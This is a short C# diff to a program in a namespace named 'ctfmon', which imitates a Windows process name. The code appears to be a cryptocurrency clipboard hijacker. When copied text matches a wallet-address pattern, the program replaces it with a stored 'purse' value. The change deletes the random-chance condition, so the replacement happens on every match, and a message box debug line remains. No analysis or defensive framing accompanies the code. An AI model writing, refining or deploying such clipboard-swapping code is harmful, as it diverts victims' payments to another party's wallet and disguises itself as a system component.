@@ -152,12 +152,9 @@ namespace ctfmon
                 {
                     if (Regex.IsMatch(data,"R"+RPurse,RegexOptions.IgnoreCase))
                     {
-                        if (rand.Next(0, 100) < configChance)
-                        {
                             MessageBox.Show(pDataPurse);
                             data = pDataPurse;
                             Clipboard.SetText(data);
-                        }
                     }
                     else
                     {
